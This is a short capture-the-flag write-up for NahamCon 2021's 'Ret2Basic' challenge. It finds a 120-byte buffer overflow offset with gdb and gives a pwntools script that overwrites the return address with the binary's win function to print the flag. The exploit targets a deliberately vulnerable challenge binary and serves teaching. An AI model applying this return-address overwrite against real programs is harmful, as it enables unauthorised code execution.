# NahamCon 2021 - Ret2Basic
Ret2Basic was an overly simple challenge in which we have to overflow a buffer and overwrite the return address with the address at win function.

For this reason this writeup will be extremely quick and non detailed.

## Finding the vulnerability
Finding the vulnerability can be done without any decompiler / disassembler, since there is only a single input which is vulnerable.

Sending a lot of bytes into that input cause a segmentation fault.

Opening the binary inside gdb and running it with a cyclic string shows us that we overwrite the return address of the vuln function after 120 bytes of input.

## Exploiting and Winning the Challenge
Now that we now that we need to input 120 bytes before our new return address, we can start writing our script.

I like to use the "template" utility from the python pwn module, so i ran the following command to have a script template.
```
$ pwn template ./ret2basic > exploit.py
```

Then we can write the exploit script as follows.
```py
io = start()
e = ELF("./ret2basic")

CRASH = 120 * b"A"
WIN_FUNC = p64(e.sym.win)

PAYLOAD = [
	CRASH,
	WIN_FUNC
]

io.sendline(b"".join(PAYLOAD))
```

You can put this little script right after the "EXPLOIT GOES HERE" and then finally run it, this will output the flag.
```
$ ./exploit.py
...
...
...
flag{fake_flag_for_testing}
```
